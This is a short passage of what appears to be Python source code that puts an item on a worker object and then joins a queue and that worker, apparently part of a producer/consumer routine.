			w.put(item)
		q.join()
		w.join()
